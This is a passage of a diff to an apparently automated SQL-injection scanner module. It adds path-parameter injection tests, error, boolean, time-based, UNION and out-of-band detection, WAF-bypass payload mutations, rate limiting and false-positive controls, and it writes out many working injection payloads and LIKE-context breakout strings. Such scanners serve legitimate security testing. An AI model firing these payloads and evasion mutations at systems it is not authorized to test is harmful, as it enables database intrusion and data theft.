+                async with httpx.AsyncClient(timeout=10, verify=False, follow_redirects=True) as client:
+                    baseline_resp = await client.get(endpoint, headers=self._auth_headers)
+                    baseline_status = baseline_resp.status_code
+                    baseline_len = len(baseline_resp.text)
+                    baseline_text = baseline_resp.text.lower()
+            except Exception as e:
+                logger.debug(f"[SQLi Path] Baseline failed: {e}")
+                continue
+
+            for payload, payload_type in path_payloads[:12]:  # Limit payloads per param
+                # Build URL with injected payload
+                modified_segments = path_segments.copy()
+
+                # URL-encode the payload for safe transmission
+                encoded_payload = quote(str(payload), safe='')
+
+                # For numeric params, replace entirely; for others, append
+                if param_type == "numeric_id":
+                    modified_segments[param_index + 1] = encoded_payload
+                else:
+                    modified_segments[param_index + 1] = original_value + encoded_payload
+
+                test_url = base_url + '/'.join(modified_segments)
+                if parsed.query:
+                    test_url += f"?{parsed.query}"
+
+                try:
+                    async with httpx.AsyncClient(timeout=10, verify=False, follow_redirects=True) as client:
+                        resp = await client.get(test_url, headers=self._auth_headers)
+
+                    resp_text = resp.text.lower()
+                    is_vulnerable = False
+                    evidence = ""
+
+                    # Check for SQL error patterns
+                    sql_errors = [
+                        "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
+                        "syntax error", "unclosed quotation", "quoted string not properly terminated",
+                        "sqlstate", "odbc", "sql server", "database error",
+                        "you have an error in your sql", "warning: mysql",
+                        "pg_query", "ora-", "sql command not properly ended",
+                    ]
+
+                    for error in sql_errors:
+                        if error in resp_text and error not in baseline_text:
+                            is_vulnerable = True
+                            evidence = f"SQL error '{error}' triggered by path injection"
+                            break
+
+                    # Check for significant response differences (boolean-based)
+                    if not is_vulnerable and resp.status_code != baseline_status:
+                        if resp.status_code == 500:
+                            is_vulnerable = True
+                            evidence = f"Server error (500) triggered by path param injection"
+                        elif baseline_status == 200 and resp.status_code in (400, 404):
+                            # Could be boolean-based - needs more testing
+                            if "1=1" in payload or "OR" in payload.upper():
+                                logger.debug(f"[SQLi Path] Potential boolean-based: {test_url}")
+
+                    if is_vulnerable:
+                        finding = {
+                            "type": "sql_injection",
+                            "severity": "CRITICAL",
+                            "title": f"SQL Injection in Path Parameter - {original_value}",
+                            "name": f"SQL Injection in Path Parameter - {original_value}",
+                            "description": (
+                                f"SQL injection vulnerability found in URL path parameter at position {param_index}. "
+                                f"Original value: {original_value}. The application embeds path segments directly "
+                                f"into SQL queries without proper sanitization."
+                            ),
+                            "evidence": evidence,
+                            "confidence": 90.0,
+                            "url": endpoint,
+                            "matched_at": endpoint,
+                            "method": "GET",
+                            "metadata": {
+                                "url": endpoint,
+                                "parameter": f"path[{param_index}]",
+                                "param_type": "path",
+                                "path_param_type": param_type,
+                                "original_value": original_value,
+                                "payload": payload,
+                                "payload_type": payload_type,
+                                "test_url": test_url,
+                                "response_status": resp.status_code,
+                                "detection_method": "path_parameter_injection",
+                            },
+                            "remediation": (
+                                "Use parameterized queries with path parameters. "
+                                "Validate path segments as integers/UUIDs before use in queries. "
+                                "Never concatenate URL path segments directly into SQL."
+                            ),
+                            "cwe": "CWE-89",
+                            "cvss": 9.8,
+                        }
+                        findings.append(finding)
+                        logger.info(f"[SQLi] Path parameter SQLi found: {endpoint} (param: {original_value})")
+                        break  # Found vuln in this param, move to next
+
+                except Exception as e:
+                    logger.debug(f"[SQLi Path] Error testing {test_url}: {e}")
+                    continue
+
+        return findings
+
     async def _cross_validate_sqli(
         self,
         base_url: str,
@@ -1651,7 +3368,29 @@ class SQLiScanner(ScanModule):
         else:
             logger.debug(f"❌ Error-based: No detection")
         
-        # 2. Test boolean-based
+        # GAP-5 FIX 2026-02-18: Early exit if error-based found with high confidence
+        # Error-based with database confirmation is already 50 points - enough for valid finding
+        # Skip slow boolean/time-based testing if we already have proof
+        if "error_based" in confirmed_methods and evidence.db_type != DatabaseType.UNKNOWN:
+            logger.info(f"[SQLi] Early exit: error-based confirmed with DB fingerprint for {param_name}")
+            # Quick UNION probe for extra confidence (fast, 2-3 requests)
+            union_result = await self._test_union_based_advanced(
+                base_url, param_name, params, cluster, ctx
+            )
+            if union_result:
+                evidence.cross_validations.append("union_based")
+                evidence.confidence_factors["union_based"] = 25
+                evidence.num_columns = union_result.num_columns
+            # Return early without slow boolean/time testing
+            total_confidence = evidence.total_confidence()
+            return SQLiResult(
+                is_vulnerable=total_confidence >= self.MIN_CONFIDENCE,
+                confidence_score=total_confidence,
+                evidence=evidence,
+                context=ctx,
+            )
+
+        # 2. Test boolean-based (only if error-based didn't confirm)
         logger.info(f"🔍 Testing boolean-based SQLi on {param_name}...")
         boolean_result = await self._test_boolean_based_advanced(
             base_url, param_name, params, cluster, detector, ctx
@@ -1667,9 +3406,10 @@ class SQLiScanner(ScanModule):
             confirmed_methods.append("boolean_blind")
         else:
             logger.debug(f"❌ Boolean-based: No detection")
-        
-        # 3. Test time-based (only if needed for confirmation)
-        if len(confirmed_methods) < 2 or not self.REQUIRE_CROSS_VALIDATION:
+
+        # 3. Test time-based (ONLY if no other methods worked - it's very slow)
+        # GAP-5 FIX: Made condition stricter - only run if we have ZERO confirmations
+        if len(confirmed_methods) == 0:
             time_result = await self._test_time_based_advanced(
                 base_url, param_name, params, detector, ctx
             )
@@ -1694,6 +3434,56 @@ class SQLiScanner(ScanModule):
                 confirmed_methods.append("union_based")
                 union_num_columns = union_result.num_columns
                 evidence.num_columns = union_num_columns
+
+        # GAP-5 FIX 2026-02-18: Early exit if we have 2+ confirmations
+        # No need for stacked queries or OOB if we already have strong evidence
+        if len(confirmed_methods) >= 2:
+            logger.info(f"[SQLi] Early exit: {len(confirmed_methods)} methods confirmed for {param_name}")
+            # Skip to confidence calculation
+        else:
+            # 5. Test STACKED QUERIES (2026-02-12) - multiple statements via semicolon
+            # Critical for INSERT/UPDATE/DELETE exploitation
+            # GAP-5 FIX: Only run if we have exactly 1 confirmation (need cross-validation)
+            if len(confirmed_methods) == 1:
+                stacked_result = await self._test_stacked_queries(
+                    base_url, param_name, params, detector, ctx
+                )
+                if stacked_result:
+                    if not evidence.payload:
+                        evidence = stacked_result
+                    else:
+                        evidence.cross_validations.append("stacked_queries")
+                    evidence.confidence_factors["stacked_queries"] = 35  # High value - dangerous
+                    confirmed_methods.append("stacked_queries")
+                    logger.info(f"✅ Stacked queries SQLi DETECTED on {param_name}!")
+
+        # 6. Test OUT-OF-BAND (2026-02-12) - DNS/HTTP callbacks for blind SQLi
+        # FIX 2026-02-19: Made OOB MANDATORY fallback to reduce ~35% blind SQLi miss rate
+        # OOB is now tested when:
+        # - No methods found anything (original behavior)
+        # - Only time-based found something (time-based alone has high FP rate)
+        # - Total confidence is below threshold
+        current_confidence = evidence.total_confidence() if confirmed_methods else 0
+        should_test_oob = (
+            self._oob_engine and (
+                len(confirmed_methods) == 0 or  # Nothing found
+                (len(confirmed_methods) == 1 and "time_blind" in confirmed_methods) or  # Only time-based
+                current_confidence < 50  # Low confidence, need OOB confirmation
+            )
+        )
+        if should_test_oob:
+            logger.info(f"🔍 Testing OOB SQLi on {param_name} (mandatory fallback)...")
+            oob_result = await self._test_oob_sqli(base_url, param_name, params, ctx)
+            if oob_result:
+                if not evidence.payload:
+                    evidence = oob_result
+                else:
+                    evidence.cross_validations.append("out_of_band")
+                evidence.confidence_factors["out_of_band"] = 50  # Very high - definitive proof
+                confirmed_methods.append("out_of_band")
+                logger.info(f"✅ Out-of-Band SQLi DETECTED on {param_name}!")
+            else:
+                logger.debug(f"❌ OOB: No callback received")
 
         # Calculate final confidence
         if not confirmed_methods:
@@ -1725,11 +3515,97 @@ class SQLiScanner(ScanModule):
 
         return SQLiResult(
             is_vulnerable=total_confidence >= self.MIN_CONFIDENCE,
-            confidence=total_confidence,
+            confidence_score=total_confidence,
             evidence=evidence,
             context=ctx,
         )
     
+    async def _test_simple_error_based(
+        self,
+        endpoint: str,
+        params: dict[str, list[str]],
+    ) -> list[dict]:
+        """FN-C6 FIX: Simple error-based SQLi when baseline fails.
+
+        This is a fallback when we can't establish a baseline cluster.
+        It only looks for obvious database error signatures.
+        """
+        findings = []
+        # FIX 2026-02-12: endpoint is a URL string, not ParsedEndpoint
+        parsed = urlparse(endpoint)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+        # Simple error-triggering payloads
+        simple_payloads = [
+            ("'", "single_quote"),
+            ('"', "double_quote"),
+            ("'--", "comment_single"),
+            ("1 OR 1=1--", "or_bypass"),
+            ("1' OR '1'='1", "or_quoted"),
+        ]
+
+        async with get_scan_client(timeout=self.timeout, http2=True) as client:
+            for param_name in params:
+                for payload, payload_name in simple_payloads:
+                    test_params = params.copy()
+                    original = (test_params.get(param_name) or [""])[0]
+                    test_params[param_name] = [original + payload]
+                    test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
+
+                    try:
+                        await self._rate_limiter.acquire(self._host)
+                        response = await client.get(test_url)
+                        content = response.text
+
+                        # Check for DB errors
+                        db_type, error_conf, pattern = DatabaseFingerprinter.detect(content)
+
+                        if db_type != DatabaseType.UNKNOWN and error_conf >= 70:
+                            # GAP-2 FIX 2026-02-13: Negative control check
+                            # Verify error pattern does NOT appear with benign input
+                            if pattern:
+                                is_valid = await self.quick_negative_control(
+                                    http_client=client,
+                                    url=base_url,
+                                    param=param_name,
+                                    indicator=pattern[:50] if len(pattern) > 50 else pattern,
+                                    vuln_vuln_type=FindingVulnType.SQLI,
+                                category=VulnCategory.INJECTION,
+                                )
+                                if not is_valid:
+                                    logger.debug(f"[SQLi] Negative control failed for {param_name}: error appears with benign input")
+                                    continue  # Skip this FP
+
+                            logger.info(f"[SQLi] Error-based detection (no baseline): {param_name} -> {db_type}")
+                            findings.append(Finding(
+                                vuln_type=FindingVulnType.SQLI,
+                                category=VulnCategory.INJECTION,
+                                name=f"SQL Injection (Error-Based) in '{param_name}'",
+                                severity=Severity.HIGH,  # Not CRITICAL without confirmation
+                                description=f"Database error detected with payload: {payload}",
+                                host=urlparse(base_url).netloc,
+                                endpoint=base_url,
+                                evidence=[
+                                    f"Parameter: {param_name}",
+                                    f"Payload: {payload}",
+                                    f"Database: {db_type.value}",
+                                    f"Error pattern: {pattern[:100] if pattern else 'N/A'}",
+                                    "Note: Detected without baseline (fallback mode)",
+                                    "Note: Negative control passed (error absent with benign input)",
+                                ],
+                                confidence_score=75.0,  # Boosted confidence with negative control
+                                cvss_score=8.6,
+                                cwe_id="CWE-89",
+                                remediation="Use parameterized queries. Never concatenate user input into SQL.",
+                            ).to_dict())
+                            break  # Found for this param, move to next
+
+                    except Exception as e:
+                        logger.debug(f"Simple error-based test failed: {e}")
+                        continue
+
+        return findings
+
     async def _test_error_based_advanced(
         self,
         base_url: str,
@@ -1740,21 +3616,104 @@ class SQLiScanner(ScanModule):
         ctx: InjectionContext,
     ) -> SQLiEvidence | None:
         """Advanced error-based SQLi detection with mutations."""
-        
-        async with httpx.AsyncClient(timeout=self.timeout, verify=False, http2=True) as client:
-            for payload, name, base_confidence in self.ERROR_PAYLOADS:
-                # Generate mutations
-                mutations = PayloadMutator.mutate(payload, ctx.detected_waf)
+
+        # PERF-FIX 2026-02-20: Use intelligent payload selection when available
+        # This reduces requests from 100+ to ~30 targeted payloads
+        intelligent_payloads = await self._get_intelligent_payloads(
+            category="sqli",
+            endpoint=base_url,
+            param_name=param_name,
+            max_payloads=MAX_INTELLIGENT_PAYLOADS,
+            asset_data=getattr(self, '_asset_data', None),
+        )
+
+        # Filter by detected DB if known
+        detected_db_str = ctx.detected_db.value if ctx.detected_db != DatabaseType.UNKNOWN else None
+        if intelligent_payloads and detected_db_str:
+            intelligent_payloads = self._filter_payloads_by_db(intelligent_payloads, detected_db_str)
+            logger.debug(f"[SQLi] Filtered to {len(intelligent_payloads)} payloads for {detected_db_str}")
+
+        async with get_scan_client(timeout=self.timeout, http2=True) as client:
+            # PERF-FIX: Try intelligent payloads first (already include mutations)
+            if intelligent_payloads:
+                for payload, effectiveness in intelligent_payloads:
+                    test_params = params.copy()
+                    original = (test_params.get(param_name) or [""])[0]
+                    test_params[param_name] = [original + payload]
+                    test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
+
+                    try:
+                        await self._rate_limiter.acquire(self._host)
+                        start = time.time()
+                        response = await client.get(test_url, headers=self._auth_headers)
+                        elapsed = time.time() - start
+                        content = response.text
+
+                        if self._is_false_positive(content, response.status_code):
+                            continue
+
+                        db_type, error_conf, pattern = DatabaseFingerprinter.detect(content)
+
+                        if db_type != DatabaseType.UNKNOWN and error_conf >= 60:
+                            if pattern:
+                                is_valid = await self.quick_negative_control(
+                                    http_client=client,
+                                    url=base_url,
+                                    param=param_name,
+                                    indicator=pattern[:50] if len(pattern) > 50 else pattern,
+                                    vuln_vuln_type=FindingVulnType.SQLI,
+                                category=VulnCategory.INJECTION,
+                                )
+                                if not is_valid:
+                                    continue
+
+                            confirmed = await self._confirm_error_sqli(
+                                client, base_url, param_name, params, db_type
+                            )
+
+                            if confirmed:
+                                fp = ResponseFingerprint.from_response(response, elapsed)
+                                version = DatabaseFingerprinter.extract_version(content, db_type)
+
+                                return SQLiEvidence(
+                                    detection_method=DetectionMethod.ERROR_BASED,
+                                    payload=payload,
+                                    mutated_payloads=[payload],
+                                    baseline_fingerprint=cluster.centroid,
+                                    injected_fingerprint=fp,
+                                    db_type=db_type,
+                                    db_version=version,
+                                    waf_detected=ctx.detected_waf,
+                                    waf_bypassed=False,
+                                    error_message=pattern,
+                                )
+
+                    except Exception as e:
+                        logger.debug(f"[SQLi] Intelligent payload test failed: {e}")
+
+                # If intelligent payloads tested but no finding, return None (skip hardcoded)
+                logger.debug(f"[SQLi] Intelligent payloads exhausted for {param_name}, no error-based SQLi found")
+                return None
+
+            # FALLBACK: Use PayloadLibrary payloads (limited to MAX_FALLBACK_PAYLOADS)
+            # 2026-02-20: Now uses centralized library with fallback to hardcoded
+            error_payloads = self._get_library_error_payloads(max_payloads=MAX_FALLBACK_PAYLOADS)
+            for payload, name, base_confidence in error_payloads:
+                # Generate mutations with WAFBypassEngine integration (2026-02-20)
+                mutations = self._get_payload_mutations(payload, ctx.detected_waf)
                 
                 for mutated_payload in mutations[:self.max_mutations]:
                     test_params = params.copy()
-                    original = test_params[param_name][0] if test_params[param_name] else ""
+                    original = (test_params.get(param_name) or [""])[0]
                     test_params[param_name] = [original + mutated_payload]
                     test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
-                    
+
                     try:
+                        # CRITICAL: Rate limit each request in the loop
+                        await self._rate_limiter.acquire(self._host)
                         start = time.time()
-                        response = await client.get(test_url)
+                        # FIX 2026-02-18: Include auth headers for authenticated endpoints
+                        response = await client.get(test_url, headers=self._auth_headers)
                         elapsed = time.time() - start
                         content = response.text
                         
@@ -1766,15 +3725,30 @@ class SQLiScanner(ScanModule):
                         db_type, error_conf, pattern = DatabaseFingerprinter.detect(content)
                         
                         if db_type != DatabaseType.UNKNOWN and error_conf >= 60:
+                            # GAP-2 FIX 2026-02-13: Negative control check
+                            # Verify error pattern does NOT appear with benign input
+                            if pattern:
+                                is_valid = await self.quick_negative_control(
+                                    http_client=client,
+                                    url=base_url,
+                                    param=param_name,
+                                    indicator=pattern[:50] if len(pattern) > 50 else pattern,
+                                    vuln_vuln_type=FindingVulnType.SQLI,
+                                category=VulnCategory.INJECTION,
+                                )
+                                if not is_valid:
+                                    logger.debug(f"[SQLi] Negative control failed for {param_name}: error appears with benign input")
+                                    continue  # Skip this FP
+
                             # Verify with confirmation payload
                             confirmed = await self._confirm_error_sqli(
                                 client, base_url, param_name, params, db_type
                             )
-                            
+
                             if confirmed:
                                 fp = ResponseFingerprint.from_response(response, elapsed)
                                 version = DatabaseFingerprinter.extract_version(content, db_type)
-                                
+
                                 evidence = SQLiEvidence(
                                     detection_method=DetectionMethod.ERROR_BASED,
                                     payload=payload,
@@ -1803,30 +3777,40 @@ class SQLiScanner(ScanModule):
         detected_db: DatabaseType,
     ) -> bool:
         """Confirm error-based SQLi with second payload."""
+        # FIX 2026-02-16: Added generic payloads for older MySQL versions
+        # extractvalue/updatexml may not exist on MySQL < 5.1 (DVWA, bWAPP)
         confirm_payloads = {
-            DatabaseType.MYSQL: ["' AND extractvalue(1,concat(0x7e,version()))--", "' AND updatexml(1,1,1)--"],
+            DatabaseType.MYSQL: [
+                "' AND '1'='1",                   # Simple, always works
+                "' AND 1=1--",                    # Comment syntax
+                "' OR 'a'='a",                    # OR bypass
+                "' AND extractvalue(1,concat(0x7e,version()))--",  # MySQL 5.1+
+                "' AND updatexml(1,1,1)--",       # MySQL 5.1+
+            ],
             DatabaseType.POSTGRESQL: ["' AND 1=cast('a' as int)--", "' AND 1::int=1/0--"],
             DatabaseType.MSSQL: ["' AND 1=CONVERT(int,'a')--", "' AND 1=1/0--"],
             DatabaseType.ORACLE: ["' AND 1=utl_inaddr.get_host_name('a')--", "' AND 1=ctxsys.drithsx.sn(1,'a')--"],
             DatabaseType.SQLITE: ["' AND 1=load_extension('a')--", "' AND 1=abs(-9223372036854775808)--"],
         }
-        
+
         payloads = confirm_payloads.get(detected_db, ["' AND '1'='1", "' OR '1'='2"])
         
         for payload in payloads:
             test_params = params.copy()
-            original = test_params[param_name][0] if test_params[param_name] else ""
+            original = (test_params.get(param_name) or [""])[0]
             test_params[param_name] = [original + payload]
             test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
-            
+
             try:
+                # FIX: Rate limit confirmation requests to avoid triggering WAF
+                await self._rate_limiter.acquire(self._host)
                 response = await client.get(test_url)
                 db_type, conf, _ = DatabaseFingerprinter.detect(response.text)
                 if db_type == detected_db:
                     return True
-            except Exception:
-                pass
-        
+            except Exception as e:
+                logger.debug(f"[SQLi] Fingerprint confirmation request failed: {e}")
+
         return False
     
     async def _test_boolean_based_advanced(
@@ -1839,16 +3823,50 @@ class SQLiScanner(ScanModule):
         ctx: InjectionContext,
     ) -> SQLiEvidence | None:
         """Advanced boolean-based blind SQLi detection."""
-        
-        async with httpx.AsyncClient(timeout=self.timeout, verify=False, http2=True) as client:
-            for true_payload, false_payload, name in self.BOOLEAN_PAYLOADS:
+
+        async with get_scan_client(timeout=self.timeout, http2=True) as client:
+            # === NEGATIVE CONTROL CHECK ===
+            # Verify that innocent (non-SQL) payload doesn't trigger detection
+            # This prevents FPs from apps that vary responses based on input length/content
+            baseline_fp = cluster.centroid
+            if baseline_fp:
+                original = (params.get(param_name) or [""])[0]
+                # Test with innocent payload (random text, no SQL syntax)
+                innocent_values = [
+                    original + "xyztest123",  # Random suffix
+                    original + " AND ",  # Partial SQL but incomplete
+                ]
+                for innocent in innocent_values:
+                    neg_params = params.copy()
+                    neg_params[param_name] = [innocent]
+                    neg_url = f"{base_url}?{urlencode(neg_params, doseq=True)}"
+                    try:
+                        neg_response = await client.get(neg_url)
+                        neg_fp = ResponseFingerprint.from_response(neg_response, 0.1)
+                        neg_similarity = neg_fp.similarity_score(baseline_fp)
+
+                        # If innocent payload causes large deviation, app is too variable
+                        # Boolean detection would be unreliable
+                        if neg_similarity < 60:
+                            logger.debug(
+                                f"[SQLi] Negative control failed: innocent payload "
+                                f"'{innocent[:30]}' caused {100-neg_similarity:.0f}% deviation"
+                            )
+                            return None  # Skip boolean detection for this param
+                    except Exception:
+                        pass  # Negative control request failed, continue anyway
+            # PERF-FIX 2026-02-20: Limit boolean payloads to reduce requests
+            # Boolean tests are expensive (2 requests per payload pair)
+            # 2026-02-20: Now uses centralized PayloadLibrary with fallback to hardcoded
+            boolean_payloads = self._get_library_boolean_payloads(max_payloads=MAX_FALLBACK_PAYLOADS)
+            for true_payload, false_payload, name in boolean_payloads:
                 # Get baseline fingerprint
                 baseline_fp = cluster.centroid
                 if not baseline_fp:
                     continue
                 
                 # Get original value
-                original = params[param_name][0] if params[param_name] else ""
+                original = (params.get(param_name) or [""])[0]
                 
                 # Determine if this is a numeric-style payload (starts with digit or minus)
                 is_numeric_payload = true_payload and (true_payload[0].isdigit() or (true_payload[0] == '-' and len(true_payload) > 1 and true_payload[1].isdigit()))
@@ -1889,12 +3907,14 @@ class SQLiScanner(ScanModule):
                 logger.debug(f"Boolean test {name}: false_url={false_url}")
                 
                 try:
-                    # Get responses
+                    # Get responses with rate limiting
+                    await self._rate_limiter.acquire(self._host)
                     start = time.time()
                     true_response = await client.get(true_url)
                     true_elapsed = time.time() - start
                     true_fp = ResponseFingerprint.from_response(true_response, true_elapsed)
-                    
+
+                    await self._rate_limiter.acquire(self._host)
                     start = time.time()
                     false_response = await client.get(false_url)
                     false_elapsed = time.time() - start
@@ -1921,29 +3941,60 @@ class SQLiScanner(ScanModule):
                     logger.debug(f"  Lengths: baseline={baseline_fp.content_length}, true={true_fp.content_length}, false={false_fp.content_length}")
                     logger.debug(f"  Length diff T/F: {length_diff_tf}, ratio: {length_ratio_tf:.2f}")
                     
-                    # Detection criteria (relaxed but still accurate)
-                    # Method 1: Traditional similarity based
+                    # === ADAPTIVE THRESHOLDS based on baseline variance ===
+                    variance = cluster.calculate_variance()
+                    sim_margin = max(10, variance["similarity_std"] * 2)  # At least 10%
+                    length_margin = max(100, variance["length_std"] * 3)  # At least 100 bytes
+
+                    # For stable apps (low variance), use tighter thresholds
+                    if variance["stable"]:
+                        sim_threshold_true = 80  # True must be very similar
+                        sim_threshold_diff = 75  # T/F must differ more
+                        length_threshold = 150   # Smaller length diff OK
+                    else:
+                        # For variable apps, require larger differences
+                        sim_threshold_true = max(60, variance["min_similarity"] - 5)
+                        sim_threshold_diff = 85
+                        length_threshold = max(200, length_margin)
+
+                    # Detection criteria with adaptive thresholds
+                    # Method 1: Traditional similarity based (adaptive)
                     similarity_based = (
-                        true_to_baseline > 70 and      # True reasonably similar to baseline
-                        false_to_baseline < 80 and     # False different from baseline  
-                        true_to_false < 85 and         # True and false different
+                        true_to_baseline > sim_threshold_true and  # True similar to baseline
+                        false_to_baseline < (true_to_baseline - sim_margin) and  # False differs more
+                        true_to_false < sim_threshold_diff and  # True and false different
                         not semantic_diff["error_appeared"]  # No new errors
                     )
-                    
-                    # Method 2: Content length based (very effective)
+
+                    # Method 2: Content length based (adaptive)
                     length_based = (
-                        length_diff_tf > 200 and       # Significant length difference
-                        length_ratio_tf < 0.9 and      # At least 10% size difference
+                        length_diff_tf > length_threshold and  # Significant length difference
+                        length_ratio_tf < 0.9 and  # At least 10% size difference
                         length_diff_true < length_diff_false  # True is closer to baseline
                     )
-                    
-                    # Method 3: Strong length difference (even stricter)
+
+                    # Method 3: Strong length difference (FN-FIX: lowered thresholds)
                     strong_length = (
-                        length_diff_tf > 1000 and      # Very significant difference  
-                        length_ratio_tf < 0.7          # At least 30% size difference
+                        length_diff_tf > 100 and  # FN-FIX: Was 1000 - too strict
+                        length_ratio_tf < 0.85  # FN-FIX: Was 0.7 - only need 15% difference
                     )
-                    
-                    is_vulnerable = similarity_based or length_based or strong_length
+
+                    # FIX 2026-02-12: Method 4 - Inverse boolean for LIKE/search contexts
+                    # In search: TRUE (OR 1=1) returns ALL data (different from baseline)
+                    #            FALSE (AND 1=2) returns NO data (same as baseline)
+                    # This is the INVERSE of normal boolean detection
+                    inverse_boolean = (
+                        true_to_baseline < 60 and  # True is DIFFERENT from baseline (returns more)
+                        false_to_baseline > 70 and  # False is SIMILAR to baseline (returns same)
+                        true_to_false < 60 and  # True and false are very different
+                        true_fp.content_length > baseline_fp.content_length * 1.5 and  # True has more data
+                        not semantic_diff["error_appeared"]  # No SQL errors
+                    )
+
+                    if inverse_boolean:
+                        logger.info(f"[SQLi] Inverse boolean detected (LIKE context): true_len={true_fp.content_length}, baseline_len={baseline_fp.content_length}")
+
+                    is_vulnerable = similarity_based or length_based or strong_length or inverse_boolean
                     
                     if is_vulnerable:
                         # Verify with second boolean pair
@@ -1981,16 +4032,24 @@ class SQLiScanner(ScanModule):
         baseline_fp: ResponseFingerprint,
     ) -> bool:
         """Verify boolean SQLi with alternative payload pair."""
+        # FIX 2026-02-12: Added LIKE-context-aware verification pairs
+        # These break out of LIKE '%search%' context with ')) and comment out trailing %'
         verify_pairs = [
+            # Standard SQL injection pairs
             ("' AND 1=1 AND 'x'='x", "' AND 1=2 AND 'x'='x"),
             ("' AND 'abc'='abc", "' AND 'abc'='def"),
             ("' OR 1=1 OR 'a'='a", "' OR 1=2 OR 'a'='a"),
+            # LIKE-context pairs (breaks out of: WHERE x LIKE '%input%')
+            ("')) OR 1=1--", "')) AND 1=2--"),  # Double paren close + comment
+            ("%')) OR 1=1--", "%')) AND 1=2--"),  # With wildcard prefix
+            ("' OR ''='", "' AND ''='x"),  # Alternative LIKE break
+            ("') OR 1=1--", "') AND 1=2--"),  # Single paren close
         ]
         
         for true_p, false_p in verify_pairs:
             try:
                 true_params = params.copy()
-                original = true_params[param_name][0] if true_params[param_name] else ""
+                original = (true_params.get(param_name) or [""])[0]
                 true_params[param_name] = [original + true_p]
                 true_url = f"{base_url}?{urlencode(true_params, doseq=True)}"
                 
@@ -2003,13 +4062,13 @@ class SQLiScanner(ScanModule):
                 
                 true_fp = ResponseFingerprint.from_response(true_resp, 0)
                 false_fp = ResponseFingerprint.from_response(false_resp, 0)
-                
+
                 if true_fp.similarity_score(false_fp) < 75:
                     return True
-                    
-            except Exception:
-                pass
-        
+
+            except Exception as e:
+                logger.debug(f"[SQLi] Boolean-based fingerprint comparison failed: {e}")
+
         return False
     
     async def _test_time_based_advanced(
@@ -2021,26 +4080,50 @@ class SQLiScanner(ScanModule):
         ctx: InjectionContext,
     ) -> SQLiEvidence | None:
         """Advanced time-based blind SQLi detection."""
-        
+
         delay = self.time_delay
-        
-        async with httpx.AsyncClient(timeout=delay + 15, verify=False, http2=True) as client:
-            for payload_template, db_type, name in self.TIME_PAYLOADS[:6]:
+
+        # PERF-FIX 2026-02-20: Prioritize payloads for detected DB type
+        # TIME_PAYLOADS format: (template, db_type, name)
+        # 2026-02-20: Now uses centralized PayloadLibrary with fallback to hardcoded
+        detected_db_str = ctx.detected_db.value.lower() if ctx.detected_db != DatabaseType.UNKNOWN else None
+
+        # Get time payloads from library (with db_type filter if available)
+        library_time_payloads = self._get_library_time_payloads(
+            db_type=detected_db_str,
+            max_payloads=self.max_time_payloads * 3  # Get more for filtering
+        )
+        # Combine with hardcoded fallback
+        all_time_payloads = library_time_payloads + self.TIME_PAYLOADS
+
+        if detected_db_str:
+            # Filter payloads matching detected DB first, then others
+            matching_payloads = [p for p in all_time_payloads if p[1].lower() == detected_db_str]
+            other_payloads = [p for p in all_time_payloads if p[1].lower() != detected_db_str]
+            time_payloads = matching_payloads[:self.max_time_payloads] or other_payloads[:self.max_time_payloads]
+            logger.debug(f"[SQLi] Prioritized {len(time_payloads)} time payloads for {detected_db_str}")
+        else:
+            time_payloads = all_time_payloads[:self.max_time_payloads]
+
+        async with get_scan_client(timeout=delay + 15, http2=True) as client:
+            for payload_template, db_type, name in time_payloads:
                 payload = payload_template.format(delay=delay)
-                
-                # Generate mutations
-                mutations = PayloadMutator.mutate(payload, ctx.detected_waf)
-                
-                for mutated_payload in mutations[:5]:
+
+                # Generate mutations with WAFBypassEngine integration (2026-02-20)
+                mutations = self._get_payload_mutations(payload, ctx.detected_waf)
+
+                # THEME-1 FIX: Test more mutations for thorough WAF bypass coverage
+                for mutated_payload in mutations[:self.max_time_mutations]:
                     test_params = params.copy()
-                    original = test_params[param_name][0] if test_params[param_name] else ""
+                    original = (test_params.get(param_name) or [""])[0]
                     test_params[param_name] = [original + mutated_payload]
                     test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
-                    
+
                     try:
-                        # Triple test for reliability
+                        # Triple test for reliability (with rate limiting)
                         times = []
                         for _ in range(3):
+                            await self._rate_limiter.acquire(self._host)
                             start = time.time()
                             await client.get(test_url)
                             elapsed = time.time() - start
@@ -2088,9 +4171,10 @@ class SQLiScanner(ScanModule):
                                     time_delays=[delay + 15],  # Timeout
                                 )
                                 return evidence
-                        except Exception:
+                        except asyncio.TimeoutError:
+                            # Expected for successful time-based — continue to evidence creation
                             pass
-                            
+
                     except Exception as e:
                         logger.debug(f"Time-based test failed: {e}")
         
@@ -2114,20 +4198,23 @@ class SQLiScanner(ScanModule):
         
         columns = ",".join(["NULL"] * num_columns)
         
-        async with httpx.AsyncClient(timeout=self.timeout, verify=False, http2=True) as client:
-            for template in self.UNION_TEMPLATES[:5]:
+        async with get_scan_client(timeout=self.timeout, http2=True) as client:
+            # THEME-1 FIX: Test more UNION templates for thorough coverage
+            for template in self.UNION_TEMPLATES[:8]:
                 payload = template.format(columns=columns)
-                mutations = PayloadMutator.mutate(payload, ctx.detected_waf)
-                
-                for mutated_payload in mutations[:5]:
+                # WAFBypassEngine integration (2026-02-20)
+                mutations = self._get_payload_mutations(payload, ctx.detected_waf)
+
+                # THEME-1 FIX: Test more mutations for WAF bypass
+                for mutated_payload in mutations[:self.max_union_mutations]:
                     test_params = params.copy()
-                    original = test_params[param_name][0] if test_params[param_name] else ""
+                    original = (test_params.get(param_name) or [""])[0]
                     test_params[param_name] = [original + mutated_payload]
                     test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
-                    
+
                     try:
                         response = await client.get(test_url)
-                        
+
                         # Success criteria: 200 status, no SQL error
                         if response.status_code == 200:
                             has_error = False
@@ -2159,7 +4246,7 @@ class SQLiScanner(ScanModule):
     ) -> int:
         """Binary search for column count (8x faster than linear)."""
         
-        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
+        async with get_scan_client(timeout=self.timeout) as client:
             low, high = 1, self.max_union_columns
             result = 0
             
@@ -2167,7 +4254,7 @@ class SQLiScanner(ScanModule):
                 mid = (low + high) // 2
                 
                 test_params = params.copy()
-                original = test_params[param_name][0] if test_params[param_name] else ""
+                original = (test_params.get(param_name) or [""])[0]
